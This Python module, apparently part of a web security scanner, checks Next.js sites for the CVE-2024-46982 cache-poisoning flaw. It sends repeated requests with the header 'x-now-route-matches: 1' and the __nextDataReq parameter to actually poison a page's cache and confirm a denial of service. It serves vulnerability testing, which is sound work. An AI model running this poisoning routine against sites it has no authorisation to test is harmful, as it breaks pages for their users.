#!/usr/bin/env python3

"""
Based on Zhero research
https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir
"""


import utils.proxy as proxy
from modules.cp_cve.unrisk_page import get_unrisk_page
from utils.style import Colors, Identify
from utils.utils import configure_logger, requests, sys

logger = configure_logger(__name__)


def test_nextjs_dos(
    url: str,
    uri: str,
    s: requests.Session,
    authent: tuple[str, str] | None = None,
) -> bool:
    """
    Teste l'exploitation du CVE-2024-46982 (DoS via cache poisoning)
    
    Args:
        url: URL de base
        uri: URI avec payload __nextDataReq=1
        s: Session requests
        authent: Credentials HTTP Basic optionnels
        
    Returns:
        True si exploitable (cache poisonné), False sinon
    """
    headers = {"x-now-route-matches": "1"}
    
    # Empoisonnement du cache avec 5 requêtes
    for _ in range(5):
        s.get(
            uri,
            headers=headers,
            verify=False,
            auth=authent,
            timeout=10,
            allow_redirects=False,
        )
    
    # Vérification de l'empoisonnement avec requête clean
    req_verify = s.get(
        url,
        verify=False,
        auth=authent,
        timeout=10,
        allow_redirects=False
    )
    
    # Vérifier si la réponse JSON persiste sans le header malveillant
    try:
        req_verify.json()
        print(
            f" {Identify.confirmed} | CVE-2024-46982 | CACHE POISONED | {Colors.BLUE}{uri}{Colors.RESET}"
        )
        return True
    except requests.exceptions.JSONDecodeError:
        # Vérifier si Content-Type est JSON même si le parsing échoue
        if "application/json" in req_verify.headers.get("Content-Type", ""):
            print(
                f" {Identify.confirmed} | CVE-2024-46982 | CACHE POISONED | {Colors.BLUE}{uri}{Colors.RESET}"
            )
            return True
    
    return False


def datareq_check(
    url: str,
    s: requests.Session,
    req_main: requests.Response,
    custom_header: dict,
    authent: tuple[str, str] | None,
) -> None:
    """
    Vérifie la vulnérabilité CVE-2024-46982 (Next.js __nextDataReq cache poisoning)
    
    Args:
        url: URL cible
        s: Session requests
        req_main: Réponse baseline de la page
        custom_header: Headers personnalisés
        authent: Credentials HTTP Basic optionnels
    """
    uri = f"{url}?__nextDataReq=1"
    
    try:
        req = s.get(
            uri,
            verify=False,
            headers=custom_header,
            allow_redirects=False,
            auth=authent,
            timeout=10,
        )

        # Vérifier les marqueurs Next.js ET que la réponse est différente
        has_nextjs_markers = ("pageProps" in req.text or "__N_SSP" in req.text)
        is_different_response = len(req.content) != len(req_main.content)
        
        if has_nextjs_markers and is_different_response:
            print(
                f" {Identify.behavior} | CVE-2024-46982 | TAG OK | {Colors.BLUE}{uri}{Colors.RESET} | PAYLOAD: x-now-route-matches: 1"
            )
            
            # Envoyer requête à Burp si proxy activé
            if proxy.proxy_enabled:
                from utils.proxy import proxy_request
                proxy_request(
                    s,
                    "GET",
                    uri,
                    headers={"x-now-route-matches": "1"},
                    data=None
                )
            
            # Trouver une page sans risque pour tester l'exploitation
            unrisk_page = get_unrisk_page(url, s, req)
            
            if unrisk_page:
                uri_exploit = f"{unrisk_page}?__nextDataReq=1"
                exploitable = test_nextjs_dos(unrisk_page, uri_exploit, s, authent)
                
                if not exploitable:
                    print(
                        f" └─ [i] Cache poisoning detected but exploitation failed. Manual verification recommended with `x-now-route-matches: 1` payload on `{uri_exploit}` url."
                    )
            else:
                print(
                    " └─ [i] [CVE-2024-46982] No risk-free pages found. Manual check required."
                )
                
    except requests.Timeout as t:
        logger.error(f"request timeout {uri}: {t}")
    except KeyboardInterrupt:
        print("Exiting")
        sys.exit()
    except Exception as e:
        logger.exception(f"request error {uri}: {e}")